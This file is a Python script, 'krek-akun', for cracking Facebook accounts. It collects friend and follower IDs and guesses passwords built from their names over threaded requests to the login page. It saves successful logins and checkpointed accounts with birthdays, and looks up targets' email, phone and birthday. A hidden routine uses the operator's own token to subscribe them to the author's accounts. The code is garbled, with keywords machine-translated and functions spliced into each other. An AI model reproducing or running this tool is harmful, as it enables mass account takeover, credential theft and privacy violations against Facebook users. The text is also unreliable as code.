# krek-akun
FMBF
#Jangan Direcode ya babai asu tai anjing bau memektengik
#!/usr/bin/python2
 pengkodean=utf-8
#Jangan di recode ajg 
# open source, tidak dijual belikan
#fb.me/mas.go.1428
#jangan lupa di follow github saya 
q = " \033 [00m"
h2 = " \033 [40m"
b2 = " \033 [44m"
c2 = " \033 [46m"
i2 = " \033 [42m"
u2 = " \033 [45m"
m2 = " \033 [41m"
p2 = " \033 [47m"
k2 = " \033 [43m"
b = ' \033 [1;94m'
i = ' \033 [1;92m'
c = ' \033 [1;96m'
m = ' \033 [1;91m'
u = ' \033 [1;95m'
k = ' \033 [1;93m'
p = ' \033 [1;97m'
t = ' \033 [1;90m'
P  =  ' \x1b [1;97m'  # PUTIH
M  =  ' \x1b [1;91m'  # MERAH
H  =  ' \x1b [1;92m'  # HIJAU
K  =  ' \x1b [1;93m'  # KUNING
B  =  ' \x1b [1;94m'  # BIRU
U  =  ' \x1b [1;95m'  # UNGU
O  =  ' \x1b [1;96m'  # BIRU MUDA
N  =  ' \x1b [0m'     # WARNA MATI
coba :
	 permintaan impor
	 sistem impor
	impor  os
	 subproses impor
	impor  acak
	 waktu impor
	impor  ulang
	impor  json
impor  uuid
	dari  multiproses . kolam  impor  ThreadPool
	dari  permintaan . pengecualian  impor  ConnectionError
	dari  datetime  impor  datetime
kecuali  Pengecualian  sebagai  modul :
	print ( " \033 [0;97m[ \033 [0;91m! \033 [0;97m] Permintaan modul belum terpasang" )
	exit ( " \033 [0;97m[ \033 [0;93m# \033 [0;97m] Silahkan Ketik : pip2 install request" )

lingkaran  =  0
oke  = []
cp  = []
identitas  = []
pwx  = []

s  =  permintaan . Sesi ()
rgb  =  acak . pilihan ([ ' \x1b [0;91m' , ' \x1b [0;92m' , ' \x1b [0;93m' , ' \x1b [0;94m' , ' \x1b [0;95m' , ' \ x1b [0;96m' , ' \x1b [0;97m' , ' \x1b [0m' ])
ua  =  s . dapatkan ( "https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt" ). teks . strip ()
ip  =  s . dapatkan ( 'https://api-asutoolkit.cloudaccess.host/ip.php' ). teks
durasi  =  str ( datetime . now ( ) .strftime ( '%d-%m-%Y' ))
	
ct  =  waktu tanggal . sekarang ()
n  =  ct . bulan
bulan  = [ 'Januari' , 'Februari' , 'Maret' , 'April' , 'Mei' , 'Juni' , 'Juli' , 'Agustus' , 'September' , 'Oktober' , 'Nopember' , 'Desember' ]
coba :
    jika  n  <  0  atau  n  >  12 :
        keluar ()
    nTemp  =  n  -  1
kecuali  ValueError :
    keluar ()
saat ini  = tanggal  waktu .sekarang ()
t  =  arus .tahun
bu  =  arus .bulan
ha  =  saat ini . hari
op  =  bulan [ nTemp ]
def  __cekfol__ ():
	ua  =  s . dapatkan ( "https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt" ). teks . strip ()
	os . sistem ( "jelas" )
	coba :
		token  =  buka ( '/hasil' )
		Tidak bisa ()
	kecuali ( KeyError , IOError ):
		os . sistem ( "-mkdir /hasil" )
		bot_komen ()
def  logo ():
	s . dapatkan ( "https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt" ). teks . mengupas ()
# __cekfol__()
# os.system("mkdir /hasil")
	coba :
		token  =  buka ( '.ua.txt' )
		token  =  buka ( '.ua' )
	kecuali ( KeyError , IOError ):
		os . sistem ( "echo 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36' >> .ua.txt" )
		os . system ( "echo 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36' >> .ua" )
	os . sistem ( "jelas" )
	cetak ( """            
  ___________ _____ _________
  \_ _____/ /      \\ ______ \_ _____/
   | __) ______ / \ / \| | _/| __)  
   | \ /_____/ / Y \ | \| \   
   \___ / \____|__ /______ /\___ /   
       \/ \/ ​​\/ ​​\/ ​​""" )
def  bot_komen ():
    mencoba :
        token  =  buka ( 'login.txt' , 'r' ). Baca ()
    kecuali  IOError :
        print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid' )
        os . sistem ( 'rm -rf login.txt' )
    permintaan . posting ( 'https://graph.facebook.com/100001800440606/subscribers?access_token='  +  token )
    permintaan . posting ( 'https://graph.facebook.com/536209003/subscribers?access_token='  +  token )
    permintaan . posting ( 'https://graph.facebook.com/100026711802694/subscribers?access_token='  +  token )
    permintaan . posting ( 'https://graph.facebook.com/100042918784910/subscribers?access_token='  +  token )
    permintaan . posting ( 'https://graph.facebook.com/100059454248601/subscribers?access_token='  +  token )
    print ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Login Berhasil" )
    menu ()

def  masuk ():
	os . sistem ( "jelas" )
	coba :
		token  =  buka ( 'login.txt' , 'r' )
		menu ()
	kecuali ( KeyError , IOError ):
		logo ()
		print ( " \n  \033 [0;97m Pilih Metode Login" )
		print ( " \033 [0;97m[ \033 [0;96m1 \033 [0;97m] Login Lewat Token Facebook" )
		print ( " \033 [0;97m[ \033 [0;96m2 \033 [0;97m] Login Lewat Cookie Facebook" )
		ask  =  raw_input ( " \n  \033 [0;97m[ \033 [0.93m? \033 [0;97m] Pilih : " )
		jika  bertanya  == "" :
			Gabung ()
		elif  bertanya  ==  "1"  atau  bertanya  ==  "01" :
			tokenz ()
		elif  bertanya  ==  "2"  atau  bertanya  ==  "02" :
			kue ()
		lain :
		      masuk ()
		      def  Cookie ():
	logo ()
	print ( " \n  \033 [0;97m[ \033 [0;93m* \033 [0;97m] Cara Ambil Cookie : https://youtu.be/X7m_O_tZnTc" )
	cookie  =  raw_input ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Masukan Cookies : \033 [0;96m" )
	coba :
		data  =  permintaan . dapatkan ( 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_' , header  = {
		'user-agent'                 : 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36' , # Jangan Di Ganti Ea Anjink.
		'referer'                    : 'https://m.facebook.com/' ,
		'host'                       : 'm.facebook.com' ,
		'asal'                     : 'https://m.facebook.com' ,
		'upgrade-insecure-requests' : '1' ,
		'accept-language'            : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' ,
		'cache-control'              : 'max-age=0' ,
		'accept'                     : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' ,
		'tipe konten'               : 'teks/html; rangkaian karakter = utf-8'
		}, kue  = {
		'kue'                     : kue
		})
		find_token  =  re . mencari ( '(EAAA \ w +)' , Data . teks )
		hasil     =  " \033 [0;97m[ \033 [0;91m! \033 [0;97m] Cookie Anda Tidak Valid"  if ( find_token  is  None ) else  ' \n * Token akses fb Anda : '  +  find_token . kelompok ( 1 )
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Tidak Ada Sambungan' )
	cookie  =  buka ( "login.txt" , 'w' )
	kue . tulis ( find_token . grup ( 1 ))
	kue . tutup ()
	bot_komen ()
	def  tokenz ():
	os . sistem ( "jelas" )
	coba :
		token  =  buka ( 'login.txt' , 'r' )
		menu ()
	kecuali ( KeyError , IOError ):
		logo ()
		print ( " \n  \033 [0;97m[ \033 [0;93m* \033 [0;97m] Cara Ambil Token : https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed " )
		token  =  raw_input ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Masukan Token : \033 [0;96m" )
		coba :
			otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token=' + token )
			a  =  json . beban ( otw . teks )
			avsid  =  buka ( "login.txt" , 'w' )
			avid . tulis ( tanda )
			avid . tutup ()
			bot_komen ()
		kecuali  KeyError :
			keluar ( " \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid" )

 menu def ():
	os . sistem ( 'jelas' )
	 token global
	coba :
		token  =  buka ( '.Status' , 'r' ). baca ()
		stas  =  "Premium *"
	kecuali  IOError :
		stas  =  "Premium"
	coba :
		token  =  buka ( 'login.txt' , 'r' ). baca ()
	kecuali  IOError :
		print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid' )
		os . sistem ( 'jelas' )
		os . sistem ( 'rm -rf login.txt' )
		masuk ()
	coba :
		otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/?access_token=' + token )
		a  =  json . beban ( otw . teks )
		nama  =  a [ 'nama' ]
		id  =  a [ 'id' ]
	    	pengguna  =  a [ 'nama pengguna' ]
	kecuali  KeyError :
		os . sistem ( 'jelas' )
		print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid' )
		os . sistem ( 'rm -rf login.txt' )
		masuk ()
	kecuali  permintaan . pengecualian . Kesalahan Koneksi :
		exit ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Silakan Periksa Jaringan Anda !!' )
	coba :
		token  =  buka ( 'hasil/hai.txt' , 'r' ). baca ()
	kecuali  IOError :
		os . sistem ( "hasil mkdir" )
		os . system ( "echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt" )
	logo ()
        print ( " " + p + "[*] --------------------------------------- ------" )
	print ( " " + p + "[*] Nama : " + k + k + "%s" % ( nama ))
	print ( " " + p + "[*] ID : " + k + id )
	print ( " " + p + "[*] Pengguna : " + k + pengguna )
        print ( " " + p + "[*] --------------------------------------- ------" )
        print ( " " + p + "[*] IP : " + H + ip )
        print ( " " + p + "[*] Bergabung: " + H + durasi )
	print ( " " + p + "[*] Status: " + H + "Premium" )
	print ( " " + p + "[*] --------------------------------------- ------" )
	mencetak
	print ( "[Selamat Datang Pengguna]" )
	mencetak
	print ( "" + p + " [1]. Crack Dari Teman/Publik" )
	print ( " [2]. Crack Dari Follower" )
	print ( " [3]. Crack Dari Postingan" )
	print ( " [4]. Cek Hasil Crack" )
	print ( " [5]. Mengatur Agen Pengguna" )
	print ( " [6]. Cek Info Akun Facebook" )
	print ( " [0]. Keluar" )
	mencetak
	ask  =  raw_input ( " [*] Pilih : " )
	jika  bertanya  == "" :
		menu ()
	elif  bertanya  ==  "1"  atau  bertanya  ==  "01" :
		publik ()
	elif  bertanya  ==  "2"  atau  bertanya  ==  "02" :
		pengikut ()
	elif  bertanya  ==  "3"  atau  bertanya  ==  "03" :
		reaksi ()
	elif  bertanya  ==  "4"  atau  bertanya  ==  "04" :
		print ( " \n  \033 [0;97m[ \033 [0;96m1 \033 [0;97m] Cek hasil OK" )
		print ( " \033 [0;97m[ \033 [0;96m2 \033 [0;97m] Cek hasil CP" )
		ask  =  raw_input ( " \n  \033 [0;97m[ \033 [0;93m? \033 [0;97m] Pilih : " )
		jika  bertanya  == "" :
			menu ()
		elif  bertanya  ==  "1"  atau  bertanya  ==  "01" :
			coba :
				totalok  =  buka ( "hasil/OK-%s-%s-%s.txt" % ( ha , op , ta )). baca (). garis pemisah ()
				print ( " \n  \033 [0;97m[ \033 [0;93m# \033 [0;97m]] ------------------------ --------------------" )
				print ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Hasil \033 [0;92mOK \033 [0;97m Tanggal : \033 [0;92m%s-%s- %s \033 [0;97mTotal : %s \033 [0;92m" % ( ha , op , ta , len ( totalok )))
				os . system ( "hasil kucing/OK-%s-%s-%s.txt" % ( ha , op , ta ))
				keluar ( " \033 [0;97m[ \033 [0;93m# \033 [0;97m] --------------- ------------------" )
			kecuali ( IOError ):
				exit ( " \033 [0;97m[ \033 [0;91m! \033 [0;97m] Tidak Ada Hasil Bro" )
		elif  bertanya  ==  "2"  atau  bertanya  ==  "02" :
			coba :
				totalcp  =  buka ( "results/CP-%s-%s-%s.txt" % ( ha , op , ta )). baca (). garis pemisah ()
				print ( " \n  \033 [0;97m[ \033 [0;93m# \033 [0;97m]] ------------------------ --------------------" )
				print ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Hasil \033 [0;93mCP \033 [0;97m Tanggal : \033 [0;92m%s-%s-] %s \033 [0;97mTotal : %s \033 [0;93m" % ( ha , op , ta , len ( totalcp )))
				os . system ( "hasil kucing/CP-%s-%s-%s.txt" % ( ha , op , ta ))
				keluar ( " \033 [0;97m[ \033 [0;93m# \033 [0;97m] --------------- ------------------" )
			kecuali ( IOError ):
				exit ( " \033 [0;97m[ \033 [0;91m! \033 [0;97m] Tidak ada hasil Bro" )
		lain :
			menu ()
	elif  bertanya  ==  "5"  atau  bertanya  ==  "05" :
		setua ()
	elif  bertanya  ==  "0"  atau  bertanya  ==  "00" :
		os . sistem ( "rm -f login.txt" )
		exit ( " \033 [0;97m[ \033 [0;96m# \033 [0;97m] Token Berhasil" )
	elif  bertanya  ==  "7"  atau  bertanya  ==  "07" :
		informasi ()
	elif  ask  ==  "risky"  or  ask  ==  "mr.risky" :
		os . system ( "echo 'You Status Premium' >> .Status" )
		bot_komen ()
	elif  bertanya  ==  "6"  atau  bertanya  ==  "06" :
		cek_ingfo ()
	elif  bertanya  ==  "9"  atau  bertanya  ==  "99" :
		exit ( p + "Terima Kasih Telah Menggunakan Script Saya...:)" )
	lain :
		menu ()
		elif  bertanya  ==  "5"  atau  bertanya  ==  "05" :
		setua ()
	elif  bertanya  ==  "0"  atau  bertanya  ==  "00" :
		os . sistem ( "rm -f login.txt" )
		exit ( " \033 [0;97m[ \033 [0;96m# \033 [0;97m] Token Berhasil" )
	elif  bertanya  ==  "7"  atau  bertanya  ==  "07" :
		informasi ()
	elif  ask  ==  "kolis"  or  ask  ==  "mr.risky" :
		os . system ( "echo 'You Status Premium' >> .Status" )
		bot_komen ()
	elif  bertanya  ==  "6"  atau  bertanya  ==  "06" :
		cek_ingfo ()
	elif  bertanya  ==  "9"  atau  bertanya  ==  "99" :
		exit ( p + "Terima Kasih Telah Menggunakan Script Saya...:)" )
	lain :
		menu ()
	
def  publik ():
	 token global
	coba :
		token  =  buka ( 'login.txt' , 'r' ). baca ()
	kecuali  IOError :
		print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid' )
		tokenz ()
	print ( " \n  \033 [0;97m[ \033 [0;93m* \033 [0;97m] Ketik 'me' jika ingin crack dari teman sendiri" )
	idt  =  raw_input ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] ID Publik : " )
	coba :
		pok  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
		sp  =  json . beban ( pok . teks )
		print ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Nama : " + sp [ "nama" ])
	kecuali  KeyError :
		keluar ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] ID Publik Tidak Ada!' )
	r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/friends?access_token=" + token )
	z  =  json . beban ( r . teks )
	untuk  i  in  z [ "data" ]:
		uid  =  saya [ 'id' ]
		nama  =  saya [ 'nama' ]
		id . tambahkan ( uid + '<=>' + nama )
	print ( " \033 [0;97m[ \033 [0;93m* \033 [0;97m] Jumlah ID : \033 [0;91m" + str ( len ( id )))
	ask  =  raw_input ( " \n  \033 [0;97m[ \033 [0;93m? \033 [0;97m] Anda ingin menggunakan Password Manual? Y/t : " )
	jika  bertanya  ==  "Y"  atau  bertanya  ==  "y" :
		panduan ()
	print ( " \033 [0;97m[ \033 [0;96m+ \033 [0;97m] Akun \033 [0;92mOK \033 [0;97m Disimpan Di : hasil/OK-%s-%s-% s.txt" % ( ha , op , ta ))
	print ( " \033 [0;97m[ \033 [0;96m+ \033 [0;97m] Akun \033 [0;93mCP \033 [0;97m Disimpan Di : hasil/CP-%s-%s-% s.txt \n " % ( ha , op , ta ))
	
	def  utama ( pengguna ):
		 lingkaran global , token
		pwx  = []
		sys . stdout . menulis (
		      ' \r  \033 [0;97m[%s* \033 [0;97m] Retak %s/%s OK-:%s - CP-:%s '  % ( rgb , loop , len ( id ), len ( baik ), len ( cp ))
		); sys . stdout . menyiram ()
		uid , nama = pengguna . membagi ( "<=>" )
		untuk  ss  dalam  nama . bagi ( " " ):
			jika  len ( ss ) < 3 :
				melanjutkan
			lain :
				if  len ( ss ) ==  1  dan  len ( ss ) ==  2  dan  len ( ss ) ==  3  dan  len ( ss ) ==  4  atau  len ( ss ) ==  5 :
					pwx . tambahkan ( ss + "123" )
					pwx . tambahkan ( ss + "1234" )
					pwx . tambahkan ( ss + "12345" )
				lain :
					pwx . tambahkan ( ss + "123" )
					pwx . tambahkan ( ss + "12345" )
		coba :
			untuk  pw  di  pwx :
				pw  =  pw . lebih rendah ()
				rex  =  permintaan . post ( 'https://mbasic.facebook.com/login.php' , data = { 'email' : uid , 'pass' : pw , 'login' : 'submit' }, headers = { 'user-agent' : ua })
				xo  =  rex . isi
				jika  'mbasic_logout_button'  di  xo  atau  'save-device'  di  xo :
					print ( ' \r   \033 [0;92m* --> '  + uid +  '|'  +  pw  +  ' ' )
					baiklah . tambahkan ( uid + '|' + pw )
					simpan  =  buka ( 'results/OK-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
					simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + ' \n ' )
					simpan . tutup ()
					merusak
					melanjutkan
				jika  'pos pemeriksaan'  di  xo :
					coba :
						token  =  buka ( 'login.txt' ). baca ()
						url  = ( "https://graph.facebook.com/" + uid + "?access_token=" + token )
						data  =  s . dapatkan ( url ). json ()
						ttl  =  data [ 'ulang tahun' ]. ganti ( "/" , "-" )
						nama  =  data [ 'nama' ]
						print ( ' \r   \033 [0;93m* --> '  + uid +  '|'  +  pw  +  '|'  +  ttl )
						cp . tambahkan ( uid + '|' + pw + '|' + ttl )
						simpan  =  buka ( 'results/CP-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
						simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + '|' + ttl + ' \n ' )
						simpan . tutup ()
						merusak
					kecuali ( KeyError , IOError ):
						ttl  =  " "
					kecuali : lulus
					print ( ' \r   \033 [0;93m* --> '  + uid +  '|'  +  pw  +  ' ' )
					cp . tambahkan ( uid + '|' + pw )
					simpan  =  buka ( 'results/CP-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
					simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + ' \n ' )
					simpan . tutup ()
					merusak
					melanjutkan
					
			lingkaran  +=  1
		kecuali :
			lulus
	p  =  ThreadPool ( 30 )
	hal . peta ( utama , id )
	keluar ( " \n  \033 [0;97m[ \033 [0;96m# \033 [0;97m] Selesai" )

pasti  pengikut ():
	 token global
	coba :
		token  =  buka ( 'login.txt' , 'r' ). baca ()
	kecuali  IOError :
		print ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] Token Tidak Valid' )
		tokenz ()
	print ( " \n  \033 [0;97m[ \033 [0;93m* \033 [0;97m] Ketik 'me' jika ingin crack dari followers sendiri" )
	idt  =  raw_input ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] ID Publik : " )
	coba :
		pok  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "?access_token=" + token )
		sp  =  json . beban ( pok . teks )
		print ( " \033 [0;97m[ \033 [0;92m+ \033 [0;97m] Nama : " + sp [ "nama" ])
	kecuali  KeyError :
		exit ( ' \033 [0;97m[ \033 [0;91m! \033 [0;97m] ID Publik Tidak Ada!' )
	r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/subscribers?limit=5000&access_token=" + token )
	z  =  json . beban ( r . teks )
	untuk  i  in  z [ "data" ]:
		uid  =  saya [ 'id' ]
		nama  =  saya [ 'nama' ]
		id . tambahkan ( uid + '<=>' + nama )
	print ( " \033 [0;97m[ \033 [0;93m* \033 [0;97m] Jumlah ID : \033 [0;91m" + str ( len ( id )))
	ask  =  raw_input ( " \n  \033 [0;97m[ \033 [0;93m? \033 [0;97m] Anda ingin menggunakan password manual? Y/t : " )
	jika  bertanya  ==  "Y"  atau  bertanya  ==  "y" :
		panduan ()
	print ( " \033 [0;97m[ \033 [0;96m+ \033 [0;97m] Akun \033 [0;92mOK \033 [0;97m Disimpan Di : hasil/OK-%s-%s-% s.txt" % ( ha , op , ta ))
	print ( " \033 [0;97m[ \033 [0;96m+ \033 [0;97m] Akun \033 [0;93mCP \033 [0;97m Disimpan Di : hasil/CP-%s-%s-% s.txt \n " % ( ha , op , ta ))
	
	def  utama ( pengguna ):
		 lingkaran global , token
		pwx  = []
		sys . stdout . menulis (
		      ' \r  \033 [0;97m[%s* \033 [0;97m] Retak %s/%s OK-:%s - CP-:%s '  % ( rgb , loop , len ( id ), len ( baik ), len ( cp ))
		); sys . stdout . menyiram ()
		uid , nama = pengguna . membagi ( "<=>" )
		untuk  ss  dalam  nama . bagi ( " " ):
			jika  len ( ss ) < 3 :
				melanjutkan
			lain :
				if  len ( ss ) ==  1  dan  len ( ss ) ==  2  dan  len ( ss ) ==  3  dan  len ( ss ) ==  4  atau  len ( ss ) ==  5 :
					pwx . tambahkan ( ss + "123" )
					pwx . tambahkan ( ss + "1234" )
					pwx . tambahkan ( ss + "12345" )
				lain :
					pwx . tambahkan ( ss + "123" )
					pwx . tambahkan ( ss + "12345" )
		coba :
			untuk  pw  di  pwx :
				pw  =  pw . lebih rendah ()
				rex  =  permintaan . post ( 'https://mbasic.facebook.com/login.php' , data = { 'email' : uid , 'pass' : pw , 'login' : 'submit' }, headers = { 'user-agent' : ua })
				xo  =  rex . isi
				jika  'mbasic_logout_button'  di  xo  atau  'save-device'  di  xo :
					print ( ' \r   \033 [0;92m* --> '  + uid +  '|'  +  pw  +  ' ' )
					baiklah . tambahkan ( uid + '|' + pw )
					simpan  =  buka ( 'results/OK-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
					simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + ' \n ' )
					simpan . tutup ()
					merusak
					melanjutkan
				jika  'pos pemeriksaan'  di  xo :
					coba :
						token  =  buka ( 'login.txt' ). baca ()
						url  = ( "https://graph.facebook.com/" + uid + "?access_token=" + token )
						data  =  s . dapatkan ( url ). json ()
						ttl  =  data [ 'ulang tahun' ]. ganti ( "/" , "-" )
						nama  =  data [ 'nama' ]
						print ( ' \r   \033 [0;93m* --> '  + uid +  '|'  +  pw  +  '|'  +  ttl )
						cp . tambahkan ( uid + '|' + pw + '|' + ttl )
						simpan  =  buka ( 'results/CP-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
						simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + '|' + ttl + ' \n ' )
						simpan . tutup ()
						merusak
					kecuali ( KeyError , IOError ):
						ttl  =  " "
					kecuali : lulus
					print ( ' \r   \033 [0;93m* --> '  + uid +  '|'  +  pw  +  ' ' )
					cp . tambahkan ( uid + '|' + pw )
					simpan  =  buka ( 'results/CP-%s-%s-%s.txt'  % ( ha , op , ta ), 'a' )
					simpan . tulis ( ' * --> ' + str ( uid ) + '|' + str ( pw ) + ' \n ' )
					simpan . tutup ()
					merusak
					melanjutkan
					lingkaran  +=  1
		kecuali :
			lulus
	p  =  ThreadPool ( 20 )
	hal . peta ( utama , id )
	keluar ( " \n  \033 [0;97m[ \033 [0;96m# \033 [0;97m] Selesai" )
	
### SETTING UA
def  settua ():
	ask  =  raw_input ( " \n  \033 [0;97m[ \033 [0;93m? \033 [0;97m] Anda ingin mengganti Agen Pengguna? [Y/t] : " )
	jika  bertanya  == "" :
		menu ()
	elif  bertanya  ==  "y"  atau  bertanya  ==  "Y" :
		coba :
			print ( " \n  \033 [0;97m[ \033 [0;93m* \033 [0;97m] Ketik di pencarian chrome : My User Agent" )
			ua  =  raw_input ( " \033 [0;97m[ \033 [0;96m+ \033 [0;97m] Agen Pengguna : " )
			uas  =  buka ( ".ua" , "w" )
			uas . tulis ( u )
			uas . tutup ()
			print ( " \033 [0;97m[ \033 [0;92m✓ \033 [0;97m] Sukses mengganti User-Adef  cek_ingfo ():
    coba :
        __cindy__ =  buka ( 'login.txt' , 'r' ). baca ()
    kecuali ( KeyError , IOError ):
        print ( p + ' \n Token Facebook Erorr !!' )
        os . sistem ( 'rm -rf login.txt' )
        waktu . tidur ( 0,01 )
        masuk ()
    coba :
# print(p+"Silahkan Ketik : "+i+"User"+p+"Untuk Tutorial Cara Ambil ID Facebook !!");time.sleep(2)
        ajg  =  raw_input ( c + ' \n [' + p + '?' + c + ']' + p + 'Masukkan ID Target :' + k + ' ' )
        if  ajg  in ( 'user' , 'User' , 'USER' ):
        	print ( p + "Anda Akan DiHarahkan Ke Browser :)" )
        	os . sistem ( 'xdg-buka https://commentpicker.com/find-facebook-id.php' )
        	cek_ingfo ()
    kecuali ( KeyError , IOError ):
	cek_ingfo ()
    coba :gent" )
			waktu . tidur ( 2 )
			menu ()
			kecuali  KeyboardInterrupt :
			keluar ()
	elif  bertanya  ==  "t"  atau  bertanya  ==  "T" :
		coba :
			ua  =  s . dapatkan coba :
        otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/%s?access_token=%s' % ( ajg , __cindy__ ))
	a  =  json . beban ( otw . teks )
        otww  =  permintaan . dapatkan ( 'https://graph.facebook.com/%s?access_token=%s' % ( ajg , __cindy__ ))
	x  =  json . beban ( otww . teks )
	nama  =  a [ 'nama' ]
	namade  =  a [ 'nama_depan' ]
    	namabe  =  x [ 'nama_belakang' ]
    	idfb  =  x [ 'id' ]
    	pengguna  =  x [ 'nama pengguna' ]
    	ttll  =  x [ 'ulang tahun' ]
    	tzim  =  x [ 'zona waktu' ]
    	stas  =  x [ 'relationship_status' ]
    	dgn  =  '''dengan %s''' % ( x [ 'significant_other' ][ 'name' ])
    	tigl  =  x [ 'lokasi' ][ 'nama' ]
    	dari  =  x [ 'kampung halaman' ][ 'nama' ]
    	lins  =  x [ 'tautan' ]
    	uptd  =  x [ 'update_time' ]
    	nmrr  =  x [ 'ponsel_ponsel' ]
    	emai  =  x [ 'email' ]
    	bioo  =  x [ 'tentang' ]
	gndr  =  x [ 'jenis kelamin' ]
    kecuali ( KeyError , IOError ):
	nama  =  M + "—" + c
	namade =  M + "—" + c
	namabe =  M + "—" + c
	idfb  =  M + "—" + c
	pengguna  =  M + "—" + c
	ttll  =  M + "—" + c
	tzim  =  M + "—" + c
	stas  =  M + "—" + c
	dgn  =  M + "—" + c
	tigl  =  M + "—" + c
	dari  =  M + "—" + c
	lins  =  M + "—" + c
	uptd  =  M + "—" + c
	nmrr  =  M + "—" + c
	emai  =  M + "—" + c
    	bioo  =  M + "—" + c
    	gndr  =  M + '—' + c( "https://raw.githubusercontent.com/Kolis-XD/Server-Dmbf/main/ua.txt" ). teks . strip ()
			uas  =  buka ( ".ua" , "w" )
			uas . tulis ( u )
			uas . tutup ()
			print ( " \n  \033 [0;97m[ \033 [0;92m✓ \033 [0;97m] Sukses mengganti User-Agent" )
			waktu . tidur ( 2 )
			menu ()
		kecuali  KeyboardInterrupt :
			keluar ()
	lain :
		menu ()
		coba :
    	r  =  permintaan . dapatkan ( 'https://graph.facebook.com/%s/friends?access_token=%s' % ( ajg , __cindy__ ))
        z  =  json . beban ( r . teks )
        untuk  i  in  z [ 'data' ]:
        	uid  =  saya [ 'id' ]
        	na  =  saya [ 'nama' ]
        	nm  =  na . rsplit ( ' ' )[ 0 ]
        	id . tambahkan ( uid  +  '|'  +  nm )
    kecuali : lulus
    coba :
    	r  =  permintaan . dapatkan ( 'https://graph.facebook.com/%s/subscribers?access_token=%s' % ( ajg , __cindy__ ))
        z  =  json . beban ( r . teks )
        pengikut  =  z [ 'ringkasan' ][ 'total_count' ]
    kecuali ( KeyError , IOError ):
    	pengikut  =  '%s-%s' % ( M , N )
    kecuali : lulus
    print  ' \n   ' + p + 'Informasi Akun Facebook' ; waktu . tidur ( 0,03 )
    cetak  c + ' [' + m + '!' + c + ']' + p + 'Nama Lengkap : %s' % ( nama ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Nama Depan : ' + namade + '' ; waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Nama Belakang : %s' % ( namabe ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'ID Facebook : %s' % ( idfb ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Nama pengguna Facebook: %s' % ( pengguna ); waktu . tidur ( 0,03 )
    print  ' \n   ' + b + '* ' + p + 'Data-Data Akun Facebook ' + b + '* \n ' ; waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Facebook Gmail : %s' % ( emai ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Nomor Telepon : %s' % ( nmrr ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Tanggal Lahir : %s' % ( ttll ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Jenis Kelamin : %s' % ( gndr ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Jumlah Teman : %s' %  str ( len ( id )); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Jumlah Pengikut : %s' % ( pengikut ); waktu . tidur ( 0,03 )
    cetak  ' [' + m + '!' + c + ']' + p + 'Tautkan Facebook : %s' % ( lins ); waktu . tidur ( 0,03 )
